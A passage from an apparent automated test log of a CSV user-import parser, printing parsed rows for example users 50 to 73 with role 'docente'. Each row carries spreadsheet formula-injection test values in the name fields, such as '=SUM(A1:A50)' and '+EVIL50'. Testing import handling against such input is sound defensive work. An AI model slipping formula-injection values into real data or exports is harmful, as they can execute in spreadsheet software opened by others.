2025-11-18T17:35:41.6411543Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6411721Z     role: [33m3[39m,
2025-11-18T17:35:41.6411906Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6412100Z     password: [33m-1[39m
2025-11-18T17:35:41.6412223Z   }
2025-11-18T17:35:41.6412335Z }
2025-11-18T17:35:41.6412558Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6412840Z   email: [32m'user50@example.com'[39m,
2025-11-18T17:35:41.6413105Z   firstName: [32m'=SUM(A1:A50)'[39m,
2025-11-18T17:35:41.6413354Z   lastName: [32m'+EVIL50'[39m,
2025-11-18T17:35:41.6413573Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6413818Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6413931Z }
2025-11-18T17:35:41.6414115Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6414304Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6415075Z   cellValues: [ [32m'user51@example.com'[39m, [32m'=SUM(A1:A51)'[39m, [32m'+EVIL51'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6415230Z   columnMapping: {
2025-11-18T17:35:41.6415671Z     email: [33m0[39m,
2025-11-18T17:35:41.6415894Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6416166Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6416355Z     role: [33m3[39m,
2025-11-18T17:35:41.6416534Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6416976Z     password: [33m-1[39m
2025-11-18T17:35:41.6417120Z   }
2025-11-18T17:35:41.6417244Z }
2025-11-18T17:35:41.6417491Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6417809Z   email: [32m'user51@example.com'[39m,
2025-11-18T17:35:41.6418115Z   firstName: [32m'=SUM(A1:A51)'[39m,
2025-11-18T17:35:41.6418395Z   lastName: [32m'+EVIL51'[39m,
2025-11-18T17:35:41.6418607Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6418871Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6418993Z }
2025-11-18T17:35:41.6419189Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6419425Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6420220Z   cellValues: [ [32m'user52@example.com'[39m, [32m'=SUM(A1:A52)'[39m, [32m'+EVIL52'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6420385Z   columnMapping: {
2025-11-18T17:35:41.6420609Z     email: [33m0[39m,
2025-11-18T17:35:41.6420816Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6421027Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6421218Z     role: [33m3[39m,
2025-11-18T17:35:41.6421427Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6421633Z     password: [33m-1[39m
2025-11-18T17:35:41.6421760Z   }
2025-11-18T17:35:41.6421877Z }
2025-11-18T17:35:41.6422116Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6422437Z   email: [32m'user52@example.com'[39m,
2025-11-18T17:35:41.6422743Z   firstName: [32m'=SUM(A1:A52)'[39m,
2025-11-18T17:35:41.6423011Z   lastName: [32m'+EVIL52'[39m,
2025-11-18T17:35:41.6423220Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6423477Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6423594Z }
2025-11-18T17:35:41.6423783Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6424022Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6424796Z   cellValues: [ [32m'user53@example.com'[39m, [32m'=SUM(A1:A53)'[39m, [32m'+EVIL53'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6424976Z   columnMapping: {
2025-11-18T17:35:41.6425210Z     email: [33m0[39m,
2025-11-18T17:35:41.6425434Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6425630Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6425814Z     role: [33m3[39m,
2025-11-18T17:35:41.6426013Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6426222Z     password: [33m-1[39m
2025-11-18T17:35:41.6426357Z   }
2025-11-18T17:35:41.6426482Z }
2025-11-18T17:35:41.6426726Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6427530Z   email: [32m'user53@example.com'[39m,
2025-11-18T17:35:41.6427795Z   firstName: [32m'=SUM(A1:A53)'[39m,
2025-11-18T17:35:41.6428037Z   lastName: [32m'+EVIL53'[39m,
2025-11-18T17:35:41.6428234Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6428477Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6428594Z }
2025-11-18T17:35:41.6428775Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6428978Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6429712Z   cellValues: [ [32m'user54@example.com'[39m, [32m'=SUM(A1:A54)'[39m, [32m'+EVIL54'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6429875Z   columnMapping: {
2025-11-18T17:35:41.6430085Z     email: [33m0[39m,
2025-11-18T17:35:41.6430295Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6430496Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6430688Z     role: [33m3[39m,
2025-11-18T17:35:41.6430870Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6431074Z     password: [33m-1[39m
2025-11-18T17:35:41.6431208Z   }
2025-11-18T17:35:41.6431323Z }
2025-11-18T17:35:41.6431559Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6431853Z   email: [32m'user54@example.com'[39m,
2025-11-18T17:35:41.6432131Z   firstName: [32m'=SUM(A1:A54)'[39m,
2025-11-18T17:35:41.6432377Z   lastName: [32m'+EVIL54'[39m,
2025-11-18T17:35:41.6432581Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6432840Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6433160Z }
2025-11-18T17:35:41.6433366Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6433581Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6434327Z   cellValues: [ [32m'user55@example.com'[39m, [32m'=SUM(A1:A55)'[39m, [32m'+EVIL55'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6434473Z   columnMapping: {
2025-11-18T17:35:41.6434671Z     email: [33m0[39m,
2025-11-18T17:35:41.6434868Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6435060Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6435251Z     role: [33m3[39m,
2025-11-18T17:35:41.6435431Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6435646Z     password: [33m-1[39m
2025-11-18T17:35:41.6435762Z   }
2025-11-18T17:35:41.6435881Z }
2025-11-18T17:35:41.6436107Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6436391Z   email: [32m'user55@example.com'[39m,
2025-11-18T17:35:41.6436670Z   firstName: [32m'=SUM(A1:A55)'[39m,
2025-11-18T17:35:41.6437104Z   lastName: [32m'+EVIL55'[39m,
2025-11-18T17:35:41.6437320Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6437566Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6437685Z }
2025-11-18T17:35:41.6437863Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6438054Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6438780Z   cellValues: [ [32m'user56@example.com'[39m, [32m'=SUM(A1:A56)'[39m, [32m'+EVIL56'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6438921Z   columnMapping: {
2025-11-18T17:35:41.6439113Z     email: [33m0[39m,
2025-11-18T17:35:41.6439299Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6439493Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6439676Z     role: [33m3[39m,
2025-11-18T17:35:41.6439849Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6440037Z     password: [33m-1[39m
2025-11-18T17:35:41.6440146Z   }
2025-11-18T17:35:41.6440263Z }
2025-11-18T17:35:41.6440489Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6440781Z   email: [32m'user56@example.com'[39m,
2025-11-18T17:35:41.6441040Z   firstName: [32m'=SUM(A1:A56)'[39m,
2025-11-18T17:35:41.6441279Z   lastName: [32m'+EVIL56'[39m,
2025-11-18T17:35:41.6441482Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6441719Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6441837Z }
2025-11-18T17:35:41.6442012Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6442207Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6442920Z   cellValues: [ [32m'user57@example.com'[39m, [32m'=SUM(A1:A57)'[39m, [32m'+EVIL57'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6443065Z   columnMapping: {
2025-11-18T17:35:41.6443249Z     email: [33m0[39m,
2025-11-18T17:35:41.6443660Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6443858Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6444036Z     role: [33m3[39m,
2025-11-18T17:35:41.6444219Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6444414Z     password: [33m-1[39m
2025-11-18T17:35:41.6444536Z   }
2025-11-18T17:35:41.6444651Z }
2025-11-18T17:35:41.6444874Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6445159Z   email: [32m'user57@example.com'[39m,
2025-11-18T17:35:41.6445422Z   firstName: [32m'=SUM(A1:A57)'[39m,
2025-11-18T17:35:41.6445663Z   lastName: [32m'+EVIL57'[39m,
2025-11-18T17:35:41.6445855Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6446093Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6446206Z }
2025-11-18T17:35:41.6446384Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6446586Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6447462Z   cellValues: [ [32m'user58@example.com'[39m, [32m'=SUM(A1:A58)'[39m, [32m'+EVIL58'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6447614Z   columnMapping: {
2025-11-18T17:35:41.6447817Z     email: [33m0[39m,
2025-11-18T17:35:41.6448022Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6448218Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6448395Z     role: [33m3[39m,
2025-11-18T17:35:41.6448579Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6448777Z     password: [33m-1[39m
2025-11-18T17:35:41.6448898Z   }
2025-11-18T17:35:41.6449012Z }
2025-11-18T17:35:41.6449449Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6449749Z   email: [32m'user58@example.com'[39m,
2025-11-18T17:35:41.6450014Z   firstName: [32m'=SUM(A1:A58)'[39m,
2025-11-18T17:35:41.6450263Z   lastName: [32m'+EVIL58'[39m,
2025-11-18T17:35:41.6450458Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6450702Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6450815Z }
2025-11-18T17:35:41.6450996Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6451187Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6451906Z   cellValues: [ [32m'user59@example.com'[39m, [32m'=SUM(A1:A59)'[39m, [32m'+EVIL59'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6452065Z   columnMapping: {
2025-11-18T17:35:41.6452250Z     email: [33m0[39m,
2025-11-18T17:35:41.6452448Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6452636Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6452817Z     role: [33m3[39m,
2025-11-18T17:35:41.6452991Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6453183Z     password: [33m-1[39m
2025-11-18T17:35:41.6453308Z   }
2025-11-18T17:35:41.6453420Z }
2025-11-18T17:35:41.6453650Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6453949Z   email: [32m'user59@example.com'[39m,
2025-11-18T17:35:41.6454225Z   firstName: [32m'=SUM(A1:A59)'[39m,
2025-11-18T17:35:41.6454469Z   lastName: [32m'+EVIL59'[39m,
2025-11-18T17:35:41.6454673Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6454922Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6455035Z }
2025-11-18T17:35:41.6455232Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6455431Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6456173Z   cellValues: [ [32m'user60@example.com'[39m, [32m'=SUM(A1:A60)'[39m, [32m'+EVIL60'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6456318Z   columnMapping: {
2025-11-18T17:35:41.6456512Z     email: [33m0[39m,
2025-11-18T17:35:41.6456706Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6457087Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6457277Z     role: [33m3[39m,
2025-11-18T17:35:41.6457466Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6457670Z     password: [33m-1[39m
2025-11-18T17:35:41.6457784Z   }
2025-11-18T17:35:41.6457904Z }
2025-11-18T17:35:41.6458131Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6458412Z   email: [32m'user60@example.com'[39m,
2025-11-18T17:35:41.6458680Z   firstName: [32m'=SUM(A1:A60)'[39m,
2025-11-18T17:35:41.6458925Z   lastName: [32m'+EVIL60'[39m,
2025-11-18T17:35:41.6459127Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6459368Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6459492Z }
2025-11-18T17:35:41.6459669Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6460086Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6460820Z   cellValues: [ [32m'user61@example.com'[39m, [32m'=SUM(A1:A61)'[39m, [32m'+EVIL61'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6460965Z   columnMapping: {
2025-11-18T17:35:41.6461158Z     email: [33m0[39m,
2025-11-18T17:35:41.6461345Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6461540Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6461729Z     role: [33m3[39m,
2025-11-18T17:35:41.6461908Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6462112Z     password: [33m-1[39m
2025-11-18T17:35:41.6462227Z   }
2025-11-18T17:35:41.6462347Z }
2025-11-18T17:35:41.6462581Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6462879Z   email: [32m'user61@example.com'[39m,
2025-11-18T17:35:41.6463148Z   firstName: [32m'=SUM(A1:A61)'[39m,
2025-11-18T17:35:41.6463393Z   lastName: [32m'+EVIL61'[39m,
2025-11-18T17:35:41.6463612Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6463872Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6464007Z }
2025-11-18T17:35:41.6464193Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6464402Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6465146Z   cellValues: [ [32m'user62@example.com'[39m, [32m'=SUM(A1:A62)'[39m, [32m'+EVIL62'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6465289Z   columnMapping: {
2025-11-18T17:35:41.6465488Z     email: [33m0[39m,
2025-11-18T17:35:41.6465888Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6466118Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6466306Z     role: [33m3[39m,
2025-11-18T17:35:41.6466497Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6466692Z     password: [33m-1[39m
2025-11-18T17:35:41.6466980Z   }
2025-11-18T17:35:41.6467101Z }
2025-11-18T17:35:41.6467319Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6467614Z   email: [32m'user62@example.com'[39m,
2025-11-18T17:35:41.6467884Z   firstName: [32m'=SUM(A1:A62)'[39m,
2025-11-18T17:35:41.6468143Z   lastName: [32m'+EVIL62'[39m,
2025-11-18T17:35:41.6468359Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6468610Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6468725Z }
2025-11-18T17:35:41.6468912Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6469140Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6469895Z   cellValues: [ [32m'user63@example.com'[39m, [32m'=SUM(A1:A63)'[39m, [32m'+EVIL63'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6470071Z   columnMapping: {
2025-11-18T17:35:41.6470305Z     email: [33m0[39m,
2025-11-18T17:35:41.6470537Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6470743Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6470940Z     role: [33m3[39m,
2025-11-18T17:35:41.6471146Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6471371Z     password: [33m-1[39m
2025-11-18T17:35:41.6471501Z   }
2025-11-18T17:35:41.6471628Z }
2025-11-18T17:35:41.6471880Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6472209Z   email: [32m'user63@example.com'[39m,
2025-11-18T17:35:41.6472514Z   firstName: [32m'=SUM(A1:A63)'[39m,
2025-11-18T17:35:41.6472812Z   lastName: [32m'+EVIL63'[39m,
2025-11-18T17:35:41.6473044Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6473311Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6473432Z }
2025-11-18T17:35:41.6473631Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6473857Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6474643Z   cellValues: [ [32m'user64@example.com'[39m, [32m'=SUM(A1:A64)'[39m, [32m'+EVIL64'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6474817Z   columnMapping: {
2025-11-18T17:35:41.6475053Z     email: [33m0[39m,
2025-11-18T17:35:41.6475289Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6475507Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6475698Z     role: [33m3[39m,
2025-11-18T17:35:41.6475894Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6476101Z     password: [33m-1[39m
2025-11-18T17:35:41.6476223Z   }
2025-11-18T17:35:41.6476335Z }
2025-11-18T17:35:41.6476569Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6477039Z   email: [32m'user64@example.com'[39m,
2025-11-18T17:35:41.6477524Z   firstName: [32m'=SUM(A1:A64)'[39m,
2025-11-18T17:35:41.6477761Z   lastName: [32m'+EVIL64'[39m,
2025-11-18T17:35:41.6477951Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6478189Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6478300Z }
2025-11-18T17:35:41.6478481Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6478670Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6479379Z   cellValues: [ [32m'user65@example.com'[39m, [32m'=SUM(A1:A65)'[39m, [32m'+EVIL65'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6479522Z   columnMapping: {
2025-11-18T17:35:41.6479726Z     email: [33m0[39m,
2025-11-18T17:35:41.6479920Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6480103Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6480283Z     role: [33m3[39m,
2025-11-18T17:35:41.6480457Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6480654Z     password: [33m-1[39m
2025-11-18T17:35:41.6480765Z   }
2025-11-18T17:35:41.6480883Z }
2025-11-18T17:35:41.6481115Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6481388Z   email: [32m'user65@example.com'[39m,
2025-11-18T17:35:41.6481647Z   firstName: [32m'=SUM(A1:A65)'[39m,
2025-11-18T17:35:41.6481878Z   lastName: [32m'+EVIL65'[39m,
2025-11-18T17:35:41.6482076Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6482307Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6482425Z }
2025-11-18T17:35:41.6482599Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6482950Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6483648Z   cellValues: [ [32m'user66@example.com'[39m, [32m'=SUM(A1:A66)'[39m, [32m'+EVIL66'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6483792Z   columnMapping: {
2025-11-18T17:35:41.6483978Z     email: [33m0[39m,
2025-11-18T17:35:41.6484164Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6484362Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6484556Z     role: [33m3[39m,
2025-11-18T17:35:41.6484743Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6484935Z     password: [33m-1[39m
2025-11-18T17:35:41.6485064Z   }
2025-11-18T17:35:41.6485175Z }
2025-11-18T17:35:41.6485407Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6485679Z   email: [32m'user66@example.com'[39m,
2025-11-18T17:35:41.6485946Z   firstName: [32m'=SUM(A1:A66)'[39m,
2025-11-18T17:35:41.6486196Z   lastName: [32m'+EVIL66'[39m,
2025-11-18T17:35:41.6486400Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6486656Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6486947Z }
2025-11-18T17:35:41.6487153Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6487368Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6488108Z   cellValues: [ [32m'user67@example.com'[39m, [32m'=SUM(A1:A67)'[39m, [32m'+EVIL67'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6488254Z   columnMapping: {
2025-11-18T17:35:41.6488454Z     email: [33m0[39m,
2025-11-18T17:35:41.6488665Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6488858Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6489047Z     role: [33m3[39m,
2025-11-18T17:35:41.6489240Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6489448Z     password: [33m-1[39m
2025-11-18T17:35:41.6489564Z   }
2025-11-18T17:35:41.6489679Z }
2025-11-18T17:35:41.6489921Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6490215Z   email: [32m'user67@example.com'[39m,
2025-11-18T17:35:41.6490491Z   firstName: [32m'=SUM(A1:A67)'[39m,
2025-11-18T17:35:41.6490741Z   lastName: [32m'+EVIL67'[39m,
2025-11-18T17:35:41.6490961Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6491212Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6491330Z }
2025-11-18T17:35:41.6491524Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6491725Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6492466Z   cellValues: [ [32m'user68@example.com'[39m, [32m'=SUM(A1:A68)'[39m, [32m'+EVIL68'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6492610Z   columnMapping: {
2025-11-18T17:35:41.6492806Z     email: [33m0[39m,
2025-11-18T17:35:41.6493000Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6493198Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6493597Z     role: [33m3[39m,
2025-11-18T17:35:41.6493779Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6493989Z     password: [33m-1[39m
2025-11-18T17:35:41.6494105Z   }
2025-11-18T17:35:41.6494225Z }
2025-11-18T17:35:41.6494458Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6494745Z   email: [32m'user68@example.com'[39m,
2025-11-18T17:35:41.6495019Z   firstName: [32m'=SUM(A1:A68)'[39m,
2025-11-18T17:35:41.6495274Z   lastName: [32m'+EVIL68'[39m,
2025-11-18T17:35:41.6495488Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6495734Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6495856Z }
2025-11-18T17:35:41.6496038Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6496236Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6497154Z   cellValues: [ [32m'user69@example.com'[39m, [32m'=SUM(A1:A69)'[39m, [32m'+EVIL69'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6497306Z   columnMapping: {
2025-11-18T17:35:41.6497511Z     email: [33m0[39m,
2025-11-18T17:35:41.6497718Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6497919Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6498101Z     role: [33m3[39m,
2025-11-18T17:35:41.6498287Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6498485Z     password: [33m-1[39m
2025-11-18T17:35:41.6498601Z   }
2025-11-18T17:35:41.6498723Z }
2025-11-18T17:35:41.6498956Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6499426Z   email: [32m'user69@example.com'[39m,
2025-11-18T17:35:41.6499710Z   firstName: [32m'=SUM(A1:A69)'[39m,
2025-11-18T17:35:41.6499968Z   lastName: [32m'+EVIL69'[39m,
2025-11-18T17:35:41.6500169Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6500415Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6500542Z }
2025-11-18T17:35:41.6500725Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6500930Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6501662Z   cellValues: [ [32m'user70@example.com'[39m, [32m'=SUM(A1:A70)'[39m, [32m'+EVIL70'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6501813Z   columnMapping: {
2025-11-18T17:35:41.6502011Z     email: [33m0[39m,
2025-11-18T17:35:41.6502207Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6502404Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6502582Z     role: [33m3[39m,
2025-11-18T17:35:41.6502768Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6502965Z     password: [33m-1[39m
2025-11-18T17:35:41.6503087Z   }
2025-11-18T17:35:41.6503203Z }
2025-11-18T17:35:41.6503439Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6503730Z   email: [32m'user70@example.com'[39m,
2025-11-18T17:35:41.6503997Z   firstName: [32m'=SUM(A1:A70)'[39m,
2025-11-18T17:35:41.6504248Z   lastName: [32m'+EVIL70'[39m,
2025-11-18T17:35:41.6504448Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6504702Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6504816Z }
2025-11-18T17:35:41.6504996Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6505200Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6505926Z   cellValues: [ [32m'user71@example.com'[39m, [32m'=SUM(A1:A71)'[39m, [32m'+EVIL71'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6506089Z   columnMapping: {
2025-11-18T17:35:41.6506282Z     email: [33m0[39m,
2025-11-18T17:35:41.6506483Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6506672Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6507116Z     role: [33m3[39m,
2025-11-18T17:35:41.6507318Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6507523Z     password: [33m-1[39m
2025-11-18T17:35:41.6507659Z   }
2025-11-18T17:35:41.6507776Z }
2025-11-18T17:35:41.6508013Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6508301Z   email: [32m'user71@example.com'[39m,
2025-11-18T17:35:41.6508573Z   firstName: [32m'=SUM(A1:A71)'[39m,
2025-11-18T17:35:41.6508817Z   lastName: [32m'+EVIL71'[39m,
2025-11-18T17:35:41.6509018Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6509269Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6509386Z }
2025-11-18T17:35:41.6509576Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6509773Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6510720Z   cellValues: [ [32m'user72@example.com'[39m, [32m'=SUM(A1:A72)'[39m, [32m'+EVIL72'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6510868Z   columnMapping: {
2025-11-18T17:35:41.6511060Z     email: [33m0[39m,
2025-11-18T17:35:41.6511265Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6511460Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6511651Z     role: [33m3[39m,
2025-11-18T17:35:41.6511839Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6512046Z     password: [33m-1[39m
2025-11-18T17:35:41.6512163Z   }
2025-11-18T17:35:41.6512278Z }
2025-11-18T17:35:41.6512514Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6512802Z   email: [32m'user72@example.com'[39m,
2025-11-18T17:35:41.6513077Z   firstName: [32m'=SUM(A1:A72)'[39m,
2025-11-18T17:35:41.6513322Z   lastName: [32m'+EVIL72'[39m,
2025-11-18T17:35:41.6513531Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6513772Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6513889Z }
2025-11-18T17:35:41.6514079Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6514289Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6515034Z   cellValues: [ [32m'user73@example.com'[39m, [32m'=SUM(A1:A73)'[39m, [32m'+EVIL73'[39m, [32m'docente'[39m ],
